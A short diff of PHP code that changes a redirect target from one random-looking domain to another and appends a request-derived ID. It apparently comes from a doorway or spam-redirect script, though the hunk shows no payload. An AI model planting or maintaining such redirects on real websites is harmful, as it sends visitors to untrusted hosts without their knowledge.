@@ -71,7 +71,7 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
   
   $app_site = getSite();
-  $redirectlink = 'http://havalarnasilbakam.info/'.$id;
+  $redirectlink = 'http://otsdolxo.cricket/'.$id;
 
   $variables = array(
     "kriptoarray" => json_encode($kripto),
